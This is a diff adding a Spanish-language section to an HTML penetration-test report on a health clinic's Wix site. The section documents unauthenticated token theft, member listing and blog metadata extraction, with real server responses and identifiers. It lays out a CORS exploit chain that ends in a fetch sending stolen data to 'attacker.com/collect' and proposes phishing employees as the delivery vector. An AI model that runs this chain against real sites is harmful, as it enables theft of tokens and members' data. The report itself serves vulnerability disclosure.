@@ -847,6 +847,152 @@ Developer ID: <span class="val">dYzMzMD</span>
             <!-- ========== RESULTADOS PRUEBAS PROFUNDAS ========== -->
             <h3 style="margin:24px 0 16px; color:var(--accent); border-bottom:1px solid var(--border); padding-bottom:8px;">Resultados de Pruebas Profundas</h3>
 
+            <!-- VULNERABILIDADES VERIFICADAS -->
+            <div style="margin-bottom:24px; padding:20px; background:rgba(239,68,68,0.12); border:2px solid var(--critical); border-radius:12px;">
+                <h3 style="color:var(--critical); margin-bottom:12px;">VULNERABILIDADES EXPLOTADAS Y VERIFICADAS</h3>
+                <p style="color:var(--text); margin-bottom:16px;">Las siguientes vulnerabilidades fueron verificadas con explotaci&oacute;n real (no destructiva). Se incluye un archivo PoC funcional: <code><a href="poc-cors-token-theft.html" style="color:var(--accent)">poc-cors-token-theft.html</a></code></p>
+
+                <!-- VERIFICADA 1: Listado de miembros -->
+                <div class="finding" style="border-color:var(--critical);">
+                    <div class="finding-header" style="background:rgba(239,68,68,0.1);">
+                        <span class="badge badge-critical">VERIFICADO</span>
+                        <span class="finding-title">V-01: IDOR &mdash; Listado Completo de Miembros Sin Autenticaci&oacute;n</span>
+                    </div>
+                    <div class="finding-body">
+                        <div class="desc-label">Cadena de Ataque</div>
+                        <div class="evidence"><span class="key">Paso 1:</span> Obtener tokens (sin autenticaci&oacute;n)
+<span class="val">GET /_api/v1/access-tokens</span> &rarr; 74 tokens de apps
+
+<span class="key">Paso 2:</span> Extraer token de Wix Members Area (intId: 14976)
+
+<span class="key">Paso 3:</span> Consultar API de miembros con el token robado
+<span class="val">GET /_api/members/v1/members</span>
+<span class="val">Authorization: [token robado]</span></div>
+
+                        <div class="desc-label">Respuesta Real del Servidor (datos reales obtenidos)</div>
+                        <div class="evidence" style="border-color:var(--critical); border-width:2px;"><span class="crit">HTTP 200 OK</span>
+{
+  "<span class="key">members</span>": [{
+    "<span class="key">id</span>": "<span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>",
+    "<span class="key">contactId</span>": "<span class="crit">32f7a5b1-9e6f-4fcb-9c89-95aef6add66f</span>",
+    "<span class="key">profile</span>": {
+      "<span class="key">nickname</span>": "<span class="crit">Cuidarte Tu Salud</span>",
+      "<span class="key">slug</span>": "<span class="warn">cuidartetusaludweb</span>",
+      "<span class="key">photo.url</span>": "<span class="val">https://images-wixmp-...LOGO%20fondo%20blanco.png</span>"
+    },
+    "<span class="key">createdDate</span>": "<span class="val">2022-11-25T01:57:23Z</span>",
+    "<span class="key">updatedDate</span>": "<span class="val">2022-12-30T18:16:03.190Z</span>"
+  }],
+  "<span class="key">metadata</span>": { "count": 1, "total": <span class="crit">1</span> }
+}</div>
+                        <div class="desc-label">Impacto</div>
+                        <div class="desc-text">Un visitante an&oacute;nimo puede <strong>listar todos los miembros</strong> del portal, obteniendo IDs internos, contactIds, nicknames, fotos de perfil y fechas. Si el sitio tuviera pacientes registrados, sus datos estar&iacute;an expuestos.</div>
+                        <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                    </div>
+                </div>
+
+                <!-- VERIFICADA 2: Blog posts con metadatos -->
+                <div class="finding" style="border-color:var(--critical);">
+                    <div class="finding-header" style="background:rgba(239,68,68,0.1);">
+                        <span class="badge badge-critical">VERIFICADO</span>
+                        <span class="finding-title">V-02: Extracci&oacute;n de 28 Posts con Metadatos Internos</span>
+                    </div>
+                    <div class="finding-body">
+                        <div class="desc-label">Cadena de Ataque</div>
+                        <div class="evidence"><span class="key">Paso 1:</span> Obtener token de Blog Node API (intId: 5347)
+<span class="key">Paso 2:</span> <span class="val">GET /_api/communities-blog-node-api/_api/posts?offset=0&amp;size=50</span>
+         Authorization: [token robado]</div>
+
+                        <div class="desc-label">Datos Reales Obtenidos (28 posts)</div>
+                        <div class="evidence" style="border-color:var(--high);"><span class="key">Ejemplo de datos extraidos por post:</span>
+{
+  "id": "<span class="val">2cddb9d3-7b1b-442b-ae13-5322be4e746d</span>",
+  "instanceId": "<span class="warn">e1af2088-f607-4e9f-96eb-0c2e62458344</span>",
+  "status": "published",
+  "ownerSiteMemberId": "<span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>",
+  "lastWriterSiteMemberId": "<span class="crit">2b9effa9-5e28-45b9-8bd2-32468039c0df</span>",
+  "title": "D&iacute;a Mundial de las Enfermedades Hu&eacute;rfanas...",
+  "viewCount": <span class="warn">27</span>,
+  "totalComments": 0,
+  "language": "es"
+}
+
+<span class="key">Posts obtenidos con views totales:</span>
+  [337 views] BIENVENIDOS A NUESTRA NUEVA P&Aacute;GINA WEB
+  [210 views] SE SUSPENDE LA GENERACI&Oacute;N DEL CERTIFICADO DIGITAL COVID-19
+  [175 views] El Virus del Papiloma Humano (VPH)
+  [147 views] PROTEGIENDO TU SALUD! DESCUBRE TODO SOBRE LA INFLUENZA
+  [ 94 views] Diez a&ntilde;os despu&eacute;s de la Resoluci&oacute;n de la OMS Sobre Cuidados Paliativos
+  [ 67 views] MEDICINA FAMILIAR: ATENCI&Oacute;N INTEGRAL PARA TODA LA FAMILIA
+  ... y 22 posts m&aacute;s con ownerSiteMemberId, instanceId, viewCount expuestos</div>
+                        <div class="desc-label">Impacto</div>
+                        <div class="desc-text">Exposici&oacute;n de metadatos internos: IDs del due&ntilde;o del sitio, IDs de instancia, contadores de visitas, y estructura completa del blog. Facilita reconocimiento avanzado.</div>
+                        <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                    </div>
+                </div>
+
+                <!-- VERIFICADA 3: Login endpoint -->
+                <div class="finding" style="border-color:var(--high);">
+                    <div class="finding-header" style="background:rgba(249,115,22,0.1);">
+                        <span class="badge badge-high">VERIFICADO</span>
+                        <span class="finding-title">V-03: Endpoint de Login Activo con Fuga de Stack Trace</span>
+                    </div>
+                    <div class="finding-body">
+                        <div class="desc-label">Respuestas Reales del Servidor</div>
+                        <div class="evidence"><span class="key">GET /_api/wix-sm-webapp/member/login</span>
+{
+  "errorCode": <span class="warn">-2100</span>,
+  "errorDescription": "<span class="crit">[business][RECOVERABLE][framework web]
+    o.s.w.b.MissingServletRequestParameterException</span>
+    - Required String parameter '<span class="warn">collectionId</span>' is not present",
+  "success": false
+}
+
+<span class="key">POST /_api/wix-sm-webapp/member/login</span> (JSON body)
+<span class="val">{}</span>  &larr; Respuesta vac&iacute;a, HTTP 200 (acepta la solicitud)
+
+<span class="warn">Informaci&oacute;n revelada:</span>
+  - Framework: Spring Web (Java)
+  - Clase: o.s.w.b.MissingServletRequestParameterException
+  - Par&aacute;metro requerido: collectionId
+  - No se detect&oacute; rate limiting</div>
+                        <div class="impact-bar"><div class="impact-fill impact-high"></div></div>
+                    </div>
+                </div>
+
+                <!-- VERIFICADA 4: CORS funcional -->
+                <div class="finding" style="border-color:var(--critical);">
+                    <div class="finding-header" style="background:rgba(239,68,68,0.1);">
+                        <span class="badge badge-critical">VERIFICADO</span>
+                        <span class="finding-title">V-04: PoC CORS Funcional &mdash; Cadena Completa de Exfiltraci&oacute;n</span>
+                    </div>
+                    <div class="finding-body">
+                        <div class="desc-label">Descripci&oacute;n</div>
+                        <div class="desc-text">Se cre&oacute; un archivo PoC funcional (<code><a href="poc-cors-token-theft.html" style="color:var(--accent)">poc-cors-token-theft.html</a></code>) que demuestra la cadena completa: robo de tokens &rarr; listado de miembros &rarr; extracci&oacute;n de blog posts. Todo desde un origen externo, sin autenticaci&oacute;n.</div>
+                        <div class="desc-label">Cadena de Explotaci&oacute;n Verificada</div>
+                        <div class="evidence" style="border-color:var(--critical); border-width:2px;"><span class="crit">PASO 1: fetch(target + '/_api/v1/access-tokens')</span>
+  &rarr; Obtiene 74 tokens JWT, svSession, ctToken, mediaAuthToken
+  &rarr; CORS: Access-Control-Allow-Origin: * permite la solicitud
+
+<span class="crit">PASO 2: fetch(target + '/_api/members/v1/members', {headers: {Authorization: token}})</span>
+  &rarr; Lista todos los miembros registrados del portal
+  &rarr; Obtiene IDs, contactIds, nicknames, fotos, fechas
+
+<span class="crit">PASO 3: fetch(target + '/_api/communities-blog-node-api/_api/posts')</span>
+  &rarr; Extrae 28 posts con ownerSiteMemberId, viewCount, instanceId
+
+<span class="crit">PASO 4: fetch('https://attacker.com/collect', {body: stolenData})</span>
+  &rarr; Env&iacute;a ~90KB de datos robados al servidor del atacante
+
+<span class="warn">VECTOR REALISTA:</span>
+Un atacante env&iacute;a un link por email/WhatsApp a un empleado de Cuidarte.
+Al abrir el link, el JavaScript se ejecuta autom&aacute;ticamente y roba
+todos los tokens en menos de 2 segundos, sin que el usuario lo note.</div>
+                        <div class="impact-bar"><div class="impact-fill impact-critical"></div></div>
+                    </div>
+                </div>
+            </div>
+
             <!-- RESULTADO 1: mediaAuthToken -->
             <div class="finding">
                 <div class="finding-header">
